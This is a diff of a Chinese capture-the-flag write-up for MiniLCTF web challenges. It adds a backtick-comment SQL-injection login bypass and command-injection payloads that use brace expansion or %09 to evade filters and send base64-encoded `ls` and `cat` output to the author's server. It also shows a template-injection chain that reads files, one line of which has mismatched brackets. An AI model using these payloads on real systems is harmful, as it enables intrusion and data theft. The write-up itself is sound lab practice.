@@ -37,15 +37,19 @@ hint2:
 
 能过滤的基本都过滤了，哭～
 
+这里最关键的就是注释符，最常见的`-- -, #, ;%00, /* `这四种都被过滤了
+
 想起来之前klaus跟我说过在某些特定情况下可以使用`反引号作注释
 
-前提就是在可以使用别名的情况下，例如`order by` `group by`
+前提就是在可以使用列名的情况下，例如`order by` `group by` `having`，后面都会跟上一个列名
 
-使用反引号时，虽然我们只输入了一个，但是mysql会自动帮我们加上后面的那个，这样我们就可以把反引号后面所有东西都当作是一个别名，从而起到注释作用
+使用反引号时，虽然我们只输入了一个，但是mysql会自动帮我们加上后面的那个，这样我们就可以把反引号后面所有东西都当作是一个列名，从而起到注释作用
 
 这里我们可以使用`group by`语句来构造
 
-因为能过滤的基本都被过滤了，不太可能又查询语句了，利用万能密码绕过
+因为能过滤的基本都被过滤了，不太可能用查询语句了，利用万能密码绕过
+
+但是由于`group by`后面跟的这个列名并不存在，会报错，所以加个`@`抑制报错
 
 payload
 
@@ -197,6 +201,8 @@ curl=vpsip:port/`ls|base64`
 ls|base64|head -n 2|tail -n 1
 ```
 
+空格使用`%09`绕过
+
 在服务器上监听
 
 ```
@@ -220,6 +226,35 @@ index.php
 直接访问`—7xabf8sahdchfudy.txt`得到flag`MiniLCTF{Y0u_G3t_1t_2333}`
 
 ![](https://ws1.sinaimg.cn/large/006Vib6xly1frebcxoeh2j30c905w0t8.jpg)
+
+这题学长说它是出题失误了，我这里说一下正解
+
+其实本不能使用`%09`绕过空格，而是要使用`{,,}`这种形式
+
+所以payload如下
+
+```
+vpsip:port/`{ls,-a}|base64`
+我也不知道为什么一定要加-a参数，但是亲测bash里确实如此，有知道的师傅，希望可以在评论区留言（请开代理）
+```
+
+和上面一样，解码即可获得文件名`--7xabf8sahdchfudy.txt`
+
+这里要注意了，因为这里文件名前面带有`--`，他会把后面的内容当作一个字符串，但是又没有中间空格，会报错
+
+所以必须我们不能直接`cat --7xabf8sahdchfudy.txt`
+
+需要通过`cat -- --7xabf8sahdchfudy.txt`才可以
+
+构造
+
+```
+vpsip:port/`{cat,--,--7xabf8sahdchfudy.txt}|base64`
+```
+
+解码获得flag
+
+我也尝试了不加base64，但是发现打印出来没有flag中的`{}`，是有问题的，保险起见还是用base64编码一下
 
 ### 幸运数字
 
@@ -267,11 +302,13 @@ index.php
 
 当我们访问到object的类型对象的时候，就可以用`__subclasses__()`来获得当前环境下能够访问的所有对象
 
-`[[''.__class__.__mro__[2].__subclasses__()]]`或者`[[(1).__class__.__base__.__subclasses__()]]`
+`[[''.__class__.__mro__[2].__subclasses__()}}`或者`{{(1).__class__.__base__.__subclasses__()]]`
 
 ![](https://ws1.sinaimg.cn/large/006Vib6xly1frghwxbelhj31400l4gvd.jpg)
 
-看到`file`，又有刚才获得的路径，我们可以读取文件了`[[''.__class__.__mro__[2].__subclasses__()[40]('./flag/flag.txt','r').read()]]`
+看到`file`，又有刚才获得的路径，我们可以读取文件了
+
+`[[''.__class__.__mro__[2].__subclasses__()[40]('./flag/flag.txt','r').read()]]`
 
 得到flag`MiniLCTF{e215h-c0adj-14sjs-mn74h}`
 
@@ -375,7 +412,7 @@ hint1: 控制台基本操作了解一下？
 
 首先给函数弄个名字`f`定义一下
 
-再定义一个变量`p`调用这个`f`函数，凭借首返回值`p`
+再定义一个变量`p`调用这个`f`函数，并接受返回值`p`
 
 输入`p`回车，看到返回结果
 
@@ -537,7 +574,7 @@ data
 {content: "Vs lbh jnag shegure vasbezngvba, cyrnfr hfr CBFG gb npprff/4qs810ss9q0pno8r342469sr3n9nn885.cuc.", enctype: "ROT13"}
 ```
 
-解rot13得到`If you want further information, please use POST to access/4df810ff9d0cab8e342469fe3a9aa885.php`
+解rot13得到`If you want further information, please use POST to access/4df810ff9d0cab8e342469fe3a9aa885.php`，这里其实是`base64` `md5` `base32` `rot13` `CRC32`五种加密或者编码方式随机返回，其中`md5`无法成功解出，多试几次就好
 
 于是请求`/4df810ff9d0cab8e342469fe3a9aa885.php`并抓包修改`GET`为`POST`
 
@@ -567,7 +604,7 @@ data
 DPI0mMOQm4BBBGUB.txt and you can read it by visiting /1bda80f2be4d3658e0baa43fbe7ae8c1.php
 ```
 
-`/1bda80f2be4d3658e0baa43fbe7ae8c1.php`，这是一个读取我们上传的文件的页面，看似没什么用，其实非常重要，待会我会说这个 页面重要在哪
+`/1bda80f2be4d3658e0baa43fbe7ae8c1.php`，这是一个读取我们上传的文件的页面，看似没什么用，其实非常重要，待会我会说这个页面重要在哪
 
 至此，我们来理一下思路
 
@@ -838,11 +875,11 @@ binwalk发现zip，foremost分离一下
 
 但是怎么提交都不对，后来又想了各种方法，都不行，但是很明确的一点是这确实是key
 
-于是猜测最后一个`l`会不会是`i`，只是显示不出来
+于是在这里卡了很久，最终猜测最后一个`l`会不会是`i`，只是显示不出来，调整一下高度，果然
+
+![](https://ws1.sinaimg.cn/large/006Vib6xly1frhrdx3tcaj30lt088gto.jpg)
 
 提交`koenokiseki`正确
-
-好坑啊。。。为什么软件在mac上总是出现这种显示不全的问题，怎么拉伸都不行～
 
 #### Lv16 虚掩
 
